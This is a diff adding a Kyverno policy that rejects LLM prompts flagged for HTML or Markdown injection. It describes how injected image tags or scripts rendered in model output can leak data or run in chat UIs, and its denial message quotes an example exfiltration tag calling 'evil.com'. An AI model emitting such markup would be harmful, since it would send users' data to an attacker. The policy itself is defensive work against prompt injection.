@@ -1,0 +1,25 @@
+apiVersion: policies.kyverno.io/v1
+kind: ValidatingPolicy
+metadata:
+  name: prompts-deny-markup-injection
+  annotations:
+    policies.kyverno.io/title: Check for HTML and Markdown injection in prompts
+    policies.kyverno.io/category: Security
+    policies.kyverno.io/type: LLM Prompt Validation
+    policies.kyverno.io/severity: critical
+    policies.kyverno.io/owasp: LLM01:2025/input-output-filtering
+    policies.kyverno.io/description: >-
+      HTML tags (script, img, iframe, form) and Markdown image references in
+      prompts can be rendered in LLM output, enabling data exfiltration via
+      image src callbacks, XSS in web-based chat UIs, or phishing via injected
+      links. Prompts should not contain executable markup.
+    policies.kyverno.io/risk-score: "40"
+spec:
+  validationActions:
+    - Deny
+  validations:
+    - message: >-
+        Markup injection detected: prompt contains HTML tags or Markdown image
+        references that could exfiltrate data or execute in a chat UI
+        (e.g., <img src="http://evil.com/steal?data=...">, <script>).
+      expression: "!('MARKUP_INJECTION' in object.spec.analysis.?indicatorIds.orValue([]))"
